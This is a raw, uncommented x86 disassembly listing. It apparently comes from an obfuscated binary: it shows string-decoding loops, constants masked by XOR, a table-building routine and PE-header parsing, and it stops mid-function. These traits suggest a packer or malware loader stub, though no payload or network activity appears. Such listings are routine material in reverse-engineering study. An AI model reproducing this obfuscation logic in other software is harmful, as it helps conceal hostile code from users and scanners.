  426f8c:	mov    edi,DWORD PTR [ebp-0x20]
  426f8f:	movzx  edi,WORD PTR [edi+ebx*2]
  426f93:	cmp    ebx,DWORD PTR [esi+0x18]
  426f96:	jae    0x426ff5
  426f98:	cmp    edi,DWORD PTR [esi+0x14]
  426f9b:	jae    0x426ff5
  426f9d:	mov    ebx,DWORD PTR [edx+ebx*4]
  426fa0:	mov    edx,DWORD PTR [ebp+0x8]
  426fa3:	mov    edi,DWORD PTR [ecx+edi*4]
  426fa6:	mov    DWORD PTR [ebp-0x4],edx
  426fa9:	lea    edx,[ebp-0x50]
  426fac:	add    ebx,eax
  426fae:	add    edi,eax
  426fb0:	sub    edx,DWORD PTR [ebp+0x8]
  426fb3:	mov    DWORD PTR [ebp-0x14],0xb
  426fba:	mov    DWORD PTR [ebp-0x24],edx
  426fbd:	mov    edx,DWORD PTR [ebp-0x4]
  426fc0:	cmp    DWORD PTR [edx],0x0
  426fc3:	jne    0x426fe0
  426fc5:	mov    eax,DWORD PTR [ebp-0x24]
  426fc8:	push   DWORD PTR [eax+edx*1]
  426fcb:	push   ebx
  426fcc:	call   0x426dc6
  426fd1:	mov    ecx,DWORD PTR [ebp-0xc]
  426fd4:	test   eax,eax
  426fd6:	je     0x426fdd
  426fd8:	mov    eax,DWORD PTR [ebp-0x4]
  426fdb:	mov    DWORD PTR [eax],edi
  426fdd:	mov    eax,DWORD PTR [ebp-0x10]
  426fe0:	add    DWORD PTR [ebp-0x4],0x4
  426fe4:	dec    DWORD PTR [ebp-0x14]
  426fe7:	jne    0x426fbd
  426fe9:	mov    ebx,DWORD PTR [ebp-0x18]
  426fec:	inc    ebx
  426fed:	mov    DWORD PTR [ebp-0x18],ebx
  426ff0:	cmp    ebx,DWORD PTR [ebp-0x8]
  426ff3:	jb     0x426f89
  426ff5:	pop    esi
  426ff6:	pop    ebx
  426ff7:	pop    edi
  426ff8:	leave  
  426ff9:	ret    0x4
  426ffc:	push   ebp
  426ffd:	mov    ebp,esp
  426fff:	mov    eax,DWORD PTR [ebp+0x8]
  427002:	push   esi
  427003:	push   DWORD PTR [eax+0x1e0]
  427009:	lea    esi,[eax+0x198]
  42700f:	mov    eax,DWORD PTR [ebp+0x8]
  427012:	call   0x426eab
  427017:	mov    ecx,DWORD PTR [esi]
  427019:	mov    DWORD PTR [ecx],eax
  42701b:	mov    eax,DWORD PTR [esi]
  42701d:	xor    ecx,ecx
  42701f:	cmp    DWORD PTR [eax],ecx
  427021:	pop    esi
  427022:	setne  cl
  427025:	mov    eax,ecx
  427027:	pop    ebp
  427028:	ret    0x4
  42702b:	mov    ecx,DWORD PTR [edi+0x188]
  427031:	push   ebx
  427032:	jmp    0x427047
  427034:	xor    eax,0x8a9c
  427039:	add    eax,0x3b5e
  42703e:	mov    WORD PTR [ecx],ax
  427041:	add    ecx,0x2
  427044:	add    edx,0x2
  427047:	movzx  eax,WORD PTR [edx]
  42704a:	mov    ebx,0x4e3e
  42704f:	cmp    ax,bx
  427052:	jne    0x427034
  427054:	xor    eax,eax
  427056:	mov    WORD PTR [ecx],ax
  427059:	mov    eax,DWORD PTR [edi+0x188]
  42705f:	pop    ebx
  427060:	ret    
  427061:	push   edi
  427062:	mov    edi,eax
  427064:	mov    eax,DWORD PTR [esi+0x188]
  42706a:	shl    edi,0x6
  42706d:	add    eax,edi
  42706f:	jmp    0x42707b
  427071:	xor    cl,0x80
  427074:	add    cl,0x5
  427077:	mov    BYTE PTR [eax],cl
  427079:	inc    eax
  42707a:	inc    edx
  42707b:	mov    cl,BYTE PTR [edx]
  42707d:	cmp    cl,0x7b
  427080:	jne    0x427071
  427082:	mov    BYTE PTR [eax],0x0
  427085:	mov    eax,DWORD PTR [esi+0x188]
  42708b:	add    eax,edi
  42708d:	pop    edi
  42708e:	ret    
  42708f:	push   ebp
  427090:	mov    ebp,esp
  427092:	sub    esp,0x14
  427095:	mov    DWORD PTR [ebp-0x10],0xf89c85b9
  42709c:	mov    DWORD PTR [ebp-0x4],0xf89c85b8
  4270a3:	mov    eax,DWORD PTR [ebx]
  4270a5:	mov    DWORD PTR [ebp-0x8],eax
  4270a8:	mov    DWORD PTR [ebp-0xc],0xf89c85a1
  4270af:	push   esi
  4270b0:	push   edi
  4270b1:	mov    DWORD PTR [ebp-0x14],0xead71899
  4270b8:	mov    edi,DWORD PTR [ebp-0x4]
  4270bb:	mov    ecx,DWORD PTR [ebp-0x10]
  4270be:	mov    eax,0x75108b1
  4270c3:	xor    edi,eax
  4270c5:	mov    edx,0x3272f8
  4270ca:	xor    ecx,eax
  4270cc:	add    edi,edx
  4270ce:	add    ecx,edx
  4270d0:	imul   edi,ecx
  4270d3:	jmp    0x42711b
  4270d5:	mov    ecx,DWORD PTR [ebp-0x8]
  4270d8:	mov    esi,DWORD PTR [ebp-0x4]
  4270db:	xor    ecx,eax
  4270dd:	xor    esi,eax
  4270df:	add    ecx,edx
  4270e1:	add    esi,edx
  4270e3:	test   esi,ecx
  4270e5:	mov    esi,DWORD PTR [ebp-0x8]
  4270e8:	mov    ecx,DWORD PTR [ebp-0x4]
  4270eb:	je     0x427102
  4270ed:	xor    ecx,eax
  4270ef:	xor    esi,eax
  4270f1:	add    ecx,edx
  4270f3:	add    esi,edx
  4270f5:	shr    esi,cl
  4270f7:	mov    ecx,DWORD PTR [ebp-0x14]
  4270fa:	xor    ecx,eax
  4270fc:	add    ecx,edx
  4270fe:	xor    esi,ecx
  427100:	jmp    0x42710c
  427102:	xor    esi,eax
  427104:	xor    ecx,eax
  427106:	add    esi,edx
  427108:	add    ecx,edx
  42710a:	shr    esi,cl
  42710c:	mov    DWORD PTR [ebp-0x8],esi
  42710f:	mov    ecx,DWORD PTR [ebp-0x4]
  427112:	xor    ecx,eax
  427114:	lea    edi,[edi+ecx*1+0x3272f8]
  42711b:	mov    ecx,DWORD PTR [ebp-0xc]
  42711e:	mov    esi,DWORD PTR [ebp-0x4]
  427121:	xor    esi,eax
  427123:	xor    ecx,eax
  427125:	sub    ecx,esi
  427127:	cmp    edi,ecx
  427129:	jbe    0x4270d5
  42712b:	mov    eax,DWORD PTR [ebp-0x8]
  42712e:	pop    edi
  42712f:	mov    DWORD PTR [ebx],eax
  427131:	mov    eax,DWORD PTR [ebp-0x8]
  427134:	pop    esi
  427135:	leave  
  427136:	ret    
  427137:	push   ebp
  427138:	mov    ebp,esp
  42713a:	sub    esp,0x38
  42713d:	push   ebx
  42713e:	mov    ebx,0xf89c85b9
  427143:	mov    DWORD PTR [ebp-0x4],ebx
  427146:	lea    ecx,[ebx-0x1]
  427149:	mov    DWORD PTR [ebp-0x24],ecx
  42714c:	mov    eax,DWORD PTR [ebp-0x4]
  42714f:	mov    edx,DWORD PTR [ebp+0x8]
  427152:	push   esi
  427153:	mov    esi,0x75108b1
  427158:	xor    eax,esi
  42715a:	push   edi
  42715b:	mov    edi,0x3272f8
  427160:	add    eax,edi
  427162:	cmp    edx,eax
  427164:	mov    eax,DWORD PTR [ebp-0x4]
  427167:	je     0x4272cc
  42716d:	mov    edx,DWORD PTR [ebp+0xc]
  427170:	xor    eax,esi
  427172:	add    eax,edi
  427174:	cmp    edx,eax
  427176:	je     0x4272c9
  42717c:	mov    eax,DWORD PTR [ebp+0x10]
  42717f:	mov    edx,DWORD PTR [ebp+0xc]
  427182:	mov    DWORD PTR [ebp-0x14],eax
  427185:	mov    eax,DWORD PTR [ebp+0x8]
  427188:	mov    DWORD PTR [ebp-0x18],0xf89c8523
  42718f:	mov    DWORD PTR [ebp-0xc],eax
  427192:	lea    eax,[ebx+0x2]
  427195:	mov    DWORD PTR [ebp-0x1c],eax
  427198:	mov    DWORD PTR [ebp-0x10],ebx
  42719b:	mov    DWORD PTR [ebp+0xc],ecx
  42719e:	mov    DWORD PTR [ebp+0x10],eax
  4271a1:	mov    eax,DWORD PTR [ebp+0xc]
  4271a4:	xor    eax,esi
  4271a6:	mov    DWORD PTR [ebp-0x20],edx
  4271a9:	sub    edx,eax
  4271ab:	sub    edx,edi
  4271ad:	mov    DWORD PTR [ebp+0x8],edx
  4271b0:	mov    DWORD PTR [ebp-0x8],0xf89c85bc
  4271b7:	jmp    0x4272b9
  4271bc:	mov    eax,DWORD PTR [ebp+0xc]
  4271bf:	mov    ecx,DWORD PTR [ebp+0xc]
  4271c2:	xor    eax,esi
  4271c4:	xor    ecx,esi
  4271c6:	lea    ecx,[eax+ecx*1+0x64e5f0]
  4271cd:	mov    eax,DWORD PTR [ebp+0x8]
  4271d0:	xor    edx,edx
  4271d2:	div    ecx
  4271d4:	mov    eax,DWORD PTR [ebp+0x10]
  4271d7:	mov    ecx,DWORD PTR [ebp+0xc]
  4271da:	xor    eax,esi
  4271dc:	xor    ecx,esi
  4271de:	sub    eax,ecx
  4271e0:	cmp    edx,eax
  4271e2:	jne    0x427278
  4271e8:	mov    eax,DWORD PTR [ebp+0x8]
  4271eb:	mov    ecx,DWORD PTR [ebp-0xc]
  4271ee:	mov    dl,BYTE PTR [eax+ecx*1]
  4271f1:	mov    eax,DWORD PTR [ebp-0x10]
  4271f4:	mov    ecx,DWORD PTR [ebp-0x8]
  4271f7:	xor    eax,esi
  4271f9:	xor    ecx,esi
  4271fb:	add    eax,edi
  4271fd:	add    ecx,edi
  4271ff:	cmp    eax,ecx
  427201:	jae    0x427249
  427203:	lea    ecx,[eax-0x3272f8]
  427209:	mov    DWORD PTR [ebp-0x4],ecx
  42720c:	mov    ebx,DWORD PTR [ebp-0x4]
  42720f:	xor    ebx,esi
  427211:	add    ebx,0x7f55d8fb
  427217:	lea    ecx,[ebp+eax*4-0x38]
  42721b:	mov    DWORD PTR [ecx],ebx
  42721d:	mov    ebx,DWORD PTR [ecx]
  42721f:	cmp    ebx,0x244ecb9a
  427225:	jbe    0x42722f
  427227:	add    DWORD PTR [ecx],0x405fcdd
  42722d:	jmp    0x427235
  42722f:	add    DWORD PTR [ecx],0xfdaf4323
  427235:	mov    ecx,DWORD PTR [ebp-0x8]
  427238:	xor    ecx,esi
  42723a:	inc    eax
  42723b:	inc    DWORD PTR [ebp-0x4]
  42723e:	add    ecx,edi
  427240:	cmp    eax,ecx
  427242:	jb     0x42720c
  427244:	mov    ebx,0xf89c85b9
  427249:	cmp    DWORD PTR [ebp-0x14],0x0
  42724d:	jne    0x427257
  42724f:	xor    dl,0x80
  427252:	add    dl,0x5
  427255:	jmp    0x42726d
  427257:	mov    eax,DWORD PTR [ebp-0x18]
  42725a:	xor    al,0xb1
  42725c:	mov    cl,0x8
  42725e:	sub    cl,al
  427260:	add    dl,cl
  427262:	mov    ecx,DWORD PTR [ebp-0x1c]
  427265:	xor    cl,0xb1
  427268:	sub    cl,0x8
  42726b:	ror    dl,cl
  42726d:	xor    eax,eax
  42726f:	mov    eax,DWORD PTR [ebp+0x8]
  427272:	mov    ecx,DWORD PTR [ebp-0xc]
  427275:	mov    BYTE PTR [eax+ecx*1],dl
  427278:	mov    eax,DWORD PTR [ebp+0x8]
  42727b:	mov    ecx,DWORD PTR [ebp-0x10]
  42727e:	sub    eax,edi
  427280:	xor    eax,esi
  427282:	cmp    eax,ecx
  427284:	jne    0x4272a7
  427286:	mov    eax,DWORD PTR [ebp+0x10]
  427289:	mov    ecx,DWORD PTR [ebp+0xc]
  42728c:	xor    eax,esi
  42728e:	xor    ecx,esi
  427290:	sub    eax,ecx
  427292:	mov    ecx,DWORD PTR [ebp-0x20]
  427295:	sub    eax,edi
  427297:	xor    eax,esi
  427299:	mov    DWORD PTR [ebp+0x10],eax
  42729c:	mov    eax,DWORD PTR [ebp+0xc]
  42729f:	xor    eax,esi
  4272a1:	sub    ecx,eax
  4272a3:	sub    ecx,edi
  4272a5:	jmp    0x4272b6
  4272a7:	mov    eax,DWORD PTR [ebp+0xc]
  4272aa:	xor    eax,esi
  4272ac:	mov    ecx,0xffcd8d08
  4272b1:	sub    ecx,eax
  4272b3:	add    ecx,DWORD PTR [ebp+0x8]
  4272b6:	mov    DWORD PTR [ebp+0x8],ecx
  4272b9:	mov    eax,DWORD PTR [ebp+0x10]
  4272bc:	cmp    eax,ebx
  4272be:	jne    0x4271bc
  4272c4:	mov    eax,DWORD PTR [ebp-0x24]
  4272c7:	jmp    0x4272cc
  4272c9:	mov    eax,DWORD PTR [ebp-0x4]
  4272cc:	xor    eax,esi
  4272ce:	add    eax,edi
  4272d0:	pop    edi
  4272d1:	pop    esi
  4272d2:	pop    ebx
  4272d3:	leave  
  4272d4:	ret    0xc
  4272d7:	push   ebp
  4272d8:	mov    ebp,esp
  4272da:	sub    esp,0x420
  4272e0:	mov    DWORD PTR [ebp-0x14],0xf89c85b9
  4272e7:	mov    DWORD PTR [ebp-0xc],0xf89c85b8
  4272ee:	mov    DWORD PTR [ebp-0x18],0xf89c86b9
  4272f5:	push   ebx
  4272f6:	mov    DWORD PTR [ebp-0x1c],0xf89c85b6
  4272fd:	mov    eax,DWORD PTR [ebp-0x14]
  427300:	push   esi
  427301:	mov    esi,0x75108b1
  427306:	push   edi
  427307:	xor    eax,esi
  427309:	mov    edi,0x3272f8
  42730e:	add    eax,edi
  427310:	mov    DWORD PTR [ebp-0x8],eax
  427313:	mov    DWORD PTR [ebp-0x20],0xf89c85a1
  42731a:	mov    DWORD PTR [ebp-0x4],0xead71899
  427321:	mov    DWORD PTR [ebp-0x10],0x8
  427328:	mov    ecx,ecx
  42732a:	mov    eax,DWORD PTR [ebp-0xc]
  42732d:	mov    ecx,DWORD PTR [ebp-0x14]
  427330:	xor    eax,esi
  427332:	xor    ecx,esi
  427334:	add    eax,edi
  427336:	add    ecx,edi
  427338:	imul   eax,ecx
  42733b:	jmp    0x42736e
  42733d:	mov    eax,DWORD PTR [ebp-0x4]
  427340:	sub    eax,edi
  427342:	xor    eax,esi
  427344:	mov    DWORD PTR [ebp-0x8],eax
  427347:	lea    ebx,[ebp-0x8]
  42734a:	call   0x42708f
  42734f:	mov    DWORD PTR [ebp-0x8],eax
  427352:	mov    eax,DWORD PTR [ebp-0x8]
  427355:	mov    ecx,DWORD PTR [ebp-0x4]
  427358:	mov    DWORD PTR [ebp+ecx*4-0x420],eax
  42735f:	mov    eax,DWORD PTR [ebp-0xc]
  427362:	mov    ecx,DWORD PTR [ebp-0x4]
  427365:	xor    eax,esi
  427367:	lea    eax,[eax+ecx*1+0x3272f8]
  42736e:	mov    DWORD PTR [ebp-0x4],eax
  427371:	mov    eax,DWORD PTR [ebp-0x18]
  427374:	mov    ecx,DWORD PTR [ebp-0xc]
  427377:	xor    ecx,esi
  427379:	xor    eax,esi
  42737b:	sub    eax,ecx
  42737d:	mov    ecx,DWORD PTR [ebp-0x4]
  427380:	cmp    ecx,eax
  427382:	jbe    0x42733d
  427384:	mov    eax,DWORD PTR [ebp-0x1c]
  427387:	xor    eax,esi
  427389:	add    eax,edi
  42738b:	mov    DWORD PTR [ebp-0x8],eax
  42738e:	mov    DWORD PTR [ebp-0x18],0xf89c86b6
  427395:	mov    ebx,ebx
  427397:	jmp    0x4273fa
  427399:	mov    ecx,DWORD PTR [ebp-0x20]
  42739c:	mov    eax,DWORD PTR [ebp-0x8]
  42739f:	xor    ecx,esi
  4273a1:	add    ecx,edi
  4273a3:	shr    eax,cl
  4273a5:	mov    DWORD PTR [ebp-0x4],eax
  4273a8:	mov    eax,DWORD PTR [ebp+0x8]
  4273ab:	mov    cl,BYTE PTR [eax]
  4273ad:	mov    BYTE PTR [ebp+0xb],cl
  4273b0:	mov    cl,BYTE PTR [ebp+0xb]
  4273b3:	mov    edx,DWORD PTR [ebp-0x8]
  4273b6:	movzx  ecx,cl
  4273b9:	xor    ecx,edx
  4273bb:	mov    DWORD PTR [ebp+0x8],ecx
  4273be:	mov    ecx,DWORD PTR [ebp-0x18]
  4273c1:	mov    edx,DWORD PTR [ebp+0x8]
  4273c4:	xor    ecx,esi
  4273c6:	add    ecx,edi
  4273c8:	and    ecx,edx
  4273ca:	mov    ecx,DWORD PTR [ebp+ecx*4-0x420]
  4273d1:	mov    edx,DWORD PTR [ebp-0x4]
  4273d4:	xor    ecx,edx
  4273d6:	mov    DWORD PTR [ebp-0x8],ecx
  4273d9:	mov    ecx,DWORD PTR [ebp-0xc]
  4273dc:	xor    ecx,esi
  4273de:	lea    eax,[eax+ecx*1+0x3272f8]
  4273e5:	mov    DWORD PTR [ebp+0x8],eax
  4273e8:	mov    eax,DWORD PTR [ebp-0xc]
  4273eb:	xor    eax,esi
  4273ed:	mov    ecx,0xffcd8d08
  4273f2:	sub    ecx,eax
  4273f4:	add    ecx,DWORD PTR [ebp-0x10]
  4273f7:	mov    DWORD PTR [ebp-0x10],ecx
  4273fa:	mov    eax,DWORD PTR [ebp-0x14]
  4273fd:	mov    ecx,DWORD PTR [ebp-0x10]
  427400:	xor    eax,esi
  427402:	add    eax,edi
  427404:	cmp    ecx,eax
  427406:	jne    0x427399
  427408:	mov    eax,DWORD PTR [ebp-0x1c]
  42740b:	mov    ecx,DWORD PTR [ebp-0x8]
  42740e:	xor    eax,esi
  427410:	add    eax,edi
  427412:	pop    edi
  427413:	pop    esi
  427414:	xor    eax,ecx
  427416:	pop    ebx
  427417:	leave  
  427418:	ret    0x4
  42741b:	push   ebp
  42741c:	mov    ebp,esp
  42741e:	mov    eax,DWORD PTR [ebp+0x1c]
  427421:	mov    ecx,DWORD PTR [ebp+0x8]
  427424:	mov    edx,DWORD PTR [ebp+0x10]
  427427:	mov    eax,DWORD PTR [eax+0x190]
  42742d:	mov    eax,DWORD PTR [eax]
  42742f:	sub    esp,0x64
  427432:	push   ebx
  427433:	push   esi
  427434:	push   edi
  427435:	mov    edi,0x75108b1
  42743a:	xor    ecx,edi
  42743c:	mov    ebx,0x3272f8
  427441:	add    ecx,ebx
  427443:	cmp    ecx,edx
  427445:	jne    0x427456
  427447:	or     DWORD PTR ds:0x3750c3f,0x4263ebce
  427451:	jmp    0x427952
  427456:	mov    ecx,DWORD PTR [ebp+0x8]
  427459:	mov    esi,DWORD PTR [ebp+0x14]
  42745c:	mov    edx,DWORD PTR [esi]
  42745e:	xor    ecx,edi
  427460:	add    ecx,ebx
  427462:	cmp    edx,ecx
  427464:	je     0x42790d
  42746a:	mov    ecx,DWORD PTR [ebp+0x1c]
  42746d:	mov    DWORD PTR [ebp-0x1c],eax
  427470:	mov    DWORD PTR [ebp+0x1c],ecx
  427473:	mov    ecx,DWORD PTR [ebp+0x18]
  427476:	mov    eax,DWORD PTR [esi]
  427478:	mov    DWORD PTR [ebp-0x20],eax
  42747b:	mov    DWORD PTR [ebp+0x8],0xf89c85b9
  427482:	mov    edx,0xf89c85b8
  427487:	mov    DWORD PTR [ebp-0x8],edx
  42748a:	mov    eax,DWORD PTR [ebp+0x1c]
  42748d:	mov    DWORD PTR [ebp+0x1c],eax
  427490:	mov    eax,DWORD PTR [ebp+0x1c]
  427493:	mov    eax,DWORD PTR [eax+0x190]
  427499:	mov    eax,DWORD PTR [eax]
  42749b:	mov    DWORD PTR [ebp-0x24],ecx
  42749e:	mov    ecx,DWORD PTR [ebp+0x1c]
  4274a1:	mov    ecx,DWORD PTR [ecx+0x190]
  4274a7:	mov    ecx,DWORD PTR [ecx]
  4274a9:	add    ecx,DWORD PTR [eax+0x3c]
  4274ac:	mov    DWORD PTR [ebp+0x10],ecx
  4274af:	mov    eax,DWORD PTR [ebp+0x8]
  4274b2:	xor    eax,edi
  4274b4:	add    eax,ebx
  4274b6:	mov    DWORD PTR [ebp-0x4],eax
  4274b9:	mov    eax,DWORD PTR [ebp+0x8]
  4274bc:	xor    eax,edi
  4274be:	add    eax,ebx
  4274c0:	mov    DWORD PTR [ebp+0x18],eax
  4274c3:	mov    eax,DWORD PTR [ebp+0x10]
  4274c6:	mov    eax,DWORD PTR [eax+0x50]
  4274c9:	sub    eax,0xc
  4274cc:	mov    DWORD PTR [ebp-0x28],eax
  4274cf:	mov    eax,DWORD PTR [ebp+0x10]
  4274d2:	mov    eax,DWORD PTR [eax+0x38]
  4274d5:	mov    ecx,DWORD PTR [ebp+0x10]
  4274d8:	dec    eax
  4274d9:	test   DWORD PTR [ecx+0x54],eax
  4274dc:	mov    eax,DWORD PTR [ebp+0x10]
  4274df:	je     0x4274f9
  4274e1:	mov    eax,DWORD PTR [eax+0x38]
  4274e4:	mov    ecx,DWORD PTR [ebp+0x10]
  4274e7:	mov    ecx,DWORD PTR [ecx+0x54]
  4274ea:	dec    eax
  4274eb:	not    eax
  4274ed:	and    ecx,eax
  4274ef:	mov    eax,DWORD PTR [ebp+0x10]
  4274f2:	mov    eax,DWORD PTR [eax+0x38]
  4274f5:	add    eax,ecx
  4274f7:	jmp    0x4274fc
  4274f9:	mov    eax,DWORD PTR [eax+0x54]
  4274fc:	mov    DWORD PTR [ebp+0x1c],eax
  4274ff:	mov    eax,DWORD PTR [ebp+0x8]
  427502:	xor    eax,edi
  427504:	add    eax,ebx
  427506:	mov    DWORD PTR [ebp+0x18],eax
  427509:	mov    eax,DWORD PTR [ebp+0x8]
  42750c:	xor    eax,edi
  42750e:	add    eax,ebx
  427510:	mov    DWORD PTR [ebp+0x18],eax
  427513:	mov    eax,DWORD PTR [ebp+0x8]
  427516:	mov    ecx,DWORD PTR [ebp-0x24]
  427519:	xor    eax,edi
  42751b:	add    eax,ebx
  42751d:	mov    DWORD PTR [ecx],eax
  42751f:	mov    DWORD PTR [ebp+0x18],edx
  427522:	mov    DWORD PTR [ebp+0x18],0xf89c85bb
  427529:	mov    DWORD PTR [ebp+0x18],0xf89c85ba
  427530:	mov    DWORD PTR [ebp+0x18],0xf89c85bd
  427537:	mov    eax,DWORD PTR [ebp-0x8]
  42753a:	mov    ecx,DWORD PTR [ebp+0x1c]
  42753d:	xor    eax,edi
  42753f:	add    eax,ebx
  427541:	imul   eax,ecx
  427544:	mov    ecx,DWORD PTR [ebp+0x8]
  427547:	mov    edx,DWORD PTR [ebp-0x28]
  42754a:	xor    ecx,edi
  42754c:	lea    ecx,[ecx+edx*1+0x3272f8]
  427553:	cmp    eax,ecx
  427555:	jae    0x427906
  42755b:	mov    eax,DWORD PTR [ebp+0x8]
  42755e:	xor    eax,edi
  427560:	add    eax,ebx
  427562:	mov    DWORD PTR [ebp+0x18],eax
  427565:	mov    eax,DWORD PTR [ebp+0x1c]
  427568:	add    eax,DWORD PTR [ebp-0x1c]
  42756b:	mov    DWORD PTR [ebp-0x4],eax
  42756e:	push   DWORD PTR [ebp-0x4]
  427571:	mov    esi,DWORD PTR [ebp-0x1c]
  427574:	mov    ecx,DWORD PTR [ebp+0x10]
  427577:	call   0x4266c7
  42757c:	mov    DWORD PTR [ebp+0xc],eax
  42757f:	mov    DWORD PTR [ebp-0x18],0xf89c85a1
  427586:	mov    eax,DWORD PTR [ebp-0x18]
  427589:	xor    eax,edi
  42758b:	lea    ecx,[ebp-0x40]
  42758e:	add    eax,ebx
  427590:	push   ecx
  427591:	call   0x426c5b
  427596:	mov    eax,DWORD PTR [ebp+0xc]
  427599:	test   eax,eax
  42759b:	je     0x4275eb
  42759d:	mov    eax,DWORD PTR [ebp-0x18]
  4275a0:	xor    eax,edi
  4275a2:	add    eax,ebx
  4275a4:	push   eax
  4275a5:	push   DWORD PTR [ebp+0xc]
  4275a8:	lea    eax,[ebp-0x40]
  4275ab:	push   eax
  4275ac:	call   0x426b51
  4275b1:	mov    eax,DWORD PTR [ebp-0x4]
  4275b4:	mov    DWORD PTR [ebp-0x18],eax
  4275b7:	mov    eax,DWORD PTR [ebp-0x18]
  4275ba:	mov    ecx,DWORD PTR [ebp-0x1c]
  4275bd:	sub    eax,ecx
  4275bf:	mov    DWORD PTR [ebp-0x18],eax
  4275c2:	mov    eax,DWORD PTR [ebp+0xc]
  4275c5:	mov    ecx,DWORD PTR [ebp+0xc]
  4275c8:	mov    eax,DWORD PTR [eax+0x10]
  4275cb:	add    eax,DWORD PTR [ecx+0xc]
  4275ce:	mov    ecx,DWORD PTR [ebp-0x18]
  4275d1:	cmp    ecx,eax
  4275d3:	jb     0x4275eb
  4275d5:	mov    eax,DWORD PTR [ebp+0xc]
  4275d8:	mov    eax,DWORD PTR [eax+0xc]
  4275db:	mov    ecx,DWORD PTR [ebp+0xc]
  4275de:	add    eax,DWORD PTR [ecx+0x8]
  4275e1:	mov    ecx,DWORD PTR [ebp-0x18]
  4275e4:	sub    eax,ecx
  4275e6:	jmp    0x4278d9
  4275eb:	push   0xc
  4275ed:	push   DWORD PTR [ebp-0x4]
  4275f0:	lea    eax,[ebp-0x4c]
  4275f3:	push   eax
  4275f4:	call   0x426b51
  4275f9:	mov    eax,0xf89c85b9
  4275fe:	mov    DWORD PTR [ebp-0x2c],eax
  427601:	mov    DWORD PTR [ebp-0x30],0xf89c85b8
  427608:	mov    DWORD PTR [ebp-0x34],0xf89c85bb
  42760f:	mov    DWORD PTR [ebp-0x38],0xf89c85ba
  427616:	lea    ecx,[ebp-0x2c]
  427619:	mov    DWORD PTR [ebp-0xc],ecx
  42761c:	lea    ecx,[ebp-0x30]
  42761f:	mov    DWORD PTR [ebp-0x10],ecx
  427622:	lea    ecx,[ebp-0x34]
  427625:	mov    DWORD PTR [ebp+0xc],ecx
  427628:	lea    ecx,[ebp-0x38]
  42762b:	mov    DWORD PTR [ebp-0x14],ecx
  42762e:	mov    ecx,DWORD PTR [ebp+0x8]
  427631:	xor    ecx,edi
  427633:	add    ecx,ebx
  427635:	mov    DWORD PTR [ebp-0x18],ecx
  427638:	jmp    0x427834
  42763d:	cmp    eax,0xf89c85bb
  427642:	je     0x427846
  427648:	mov    ecx,DWORD PTR [ebp-0x8]
  42764b:	xor    ecx,edi
  42764d:	mov    esi,eax
  42764f:	add    ecx,ebx
  427651:	mov    DWORD PTR [ebp+0x18],ecx
  427654:	mov    eax,DWORD PTR [ebp-0x18]
  427657:	xor    esi,edi
  427659:	lea    eax,[eax+esi*1+0x3272f8]
  427660:	mov    DWORD PTR [ebp-0x18],eax
  427663:	mov    eax,DWORD PTR [ebp-0x8]
  427666:	mov    ecx,DWORD PTR [ebp-0x18]
  427669:	xor    eax,edi
  42766b:	add    eax,ebx
  42766d:	cmp    ecx,eax
  42766f:	jne    0x427684
  427671:	mov    eax,DWORD PTR [ebp+0x8]
  427674:	xor    eax,edi
  427676:	add    eax,ebx
  427678:	push   eax
  427679:	push   0xc
  42767b:	lea    eax,[ebp-0x4c]
  42767e:	push   eax
  42767f:	call   0x427137
  427684:	mov    eax,DWORD PTR [ebp-0xc]
  427687:	mov    eax,DWORD PTR [eax]
  427689:	xor    eax,edi
  42768b:	mov    al,BYTE PTR [ebp+eax*1+0x3272ac]
  427692:	mov    ecx,DWORD PTR [ebp+0x8]
  427695:	xor    ecx,edi
  427697:	movzx  eax,al
  42769a:	add    ecx,ebx
  42769c:	cmp    eax,ecx
  42769e:	je     0x42781c
  4276a4:	mov    eax,DWORD PTR [ebp-0x10]
  4276a7:	mov    eax,DWORD PTR [eax]
  4276a9:	xor    eax,edi
  4276ab:	mov    al,BYTE PTR [ebp+eax*1+0x3272ac]
  4276b2:	mov    ecx,DWORD PTR [ebp+0x8]
  4276b5:	xor    ecx,edi
  4276b7:	movzx  eax,al
  4276ba:	add    ecx,ebx
  4276bc:	cmp    eax,ecx
  4276be:	je     0x42781c
  4276c4:	mov    eax,DWORD PTR [ebp+0xc]
  4276c7:	mov    eax,DWORD PTR [eax]
  4276c9:	xor    eax,edi
  4276cb:	mov    al,BYTE PTR [ebp+eax*1+0x3272ac]
  4276d2:	mov    ecx,DWORD PTR [ebp+0x8]
  4276d5:	xor    ecx,edi
  4276d7:	movzx  eax,al
  4276da:	add    ecx,ebx
  4276dc:	cmp    eax,ecx
  4276de:	je     0x42781c
  4276e4:	mov    eax,DWORD PTR [ebp-0x14]
  4276e7:	mov    eax,DWORD PTR [eax]
  4276e9:	xor    eax,edi
  4276eb:	mov    al,BYTE PTR [ebp+eax*1+0x3272ac]
  4276f2:	mov    ecx,DWORD PTR [ebp+0x8]
  4276f5:	xor    ecx,edi
  4276f7:	movzx  eax,al
  4276fa:	add    ecx,ebx
  4276fc:	cmp    eax,ecx
  4276fe:	je     0x42781c
  427704:	mov    eax,DWORD PTR [ebp-0x10]
  427707:	mov    eax,DWORD PTR [eax]
  427709:	xor    eax,edi
  42770b:	mov    al,BYTE PTR [ebp+eax*1+0x3272ac]
  427712:	mov    ecx,DWORD PTR [ebp-0xc]
  427715:	mov    ecx,DWORD PTR [ecx]
  427717:	xor    ecx,edi
  427719:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272ac]
  427720:	xor    al,cl
  427722:	mov    ecx,DWORD PTR [ebp+0xc]
  427725:	mov    ecx,DWORD PTR [ecx]
  427727:	xor    ecx,edi
  427729:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272ac]
  427730:	or     al,cl
  427732:	mov    ecx,DWORD PTR [ebp-0xc]
  427735:	mov    ecx,DWORD PTR [ecx]
  427737:	xor    ecx,edi
  427739:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272b0]
  427740:	cmp    cl,al
  427742:	jne    0x42781c
  427748:	mov    eax,DWORD PTR [ebp+0xc]
  42774b:	mov    eax,DWORD PTR [eax]
  42774d:	xor    eax,edi
  42774f:	mov    al,BYTE PTR [ebp+eax*1+0x3272ac]
  427756:	mov    ecx,DWORD PTR [ebp-0x10]
  427759:	mov    ecx,DWORD PTR [ecx]
  42775b:	xor    ecx,edi
  42775d:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272ac]
  427764:	xor    al,cl
  427766:	mov    ecx,DWORD PTR [ebp-0x14]
  427769:	mov    ecx,DWORD PTR [ecx]
  42776b:	xor    ecx,edi
  42776d:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272ac]
  427774:	or     al,cl
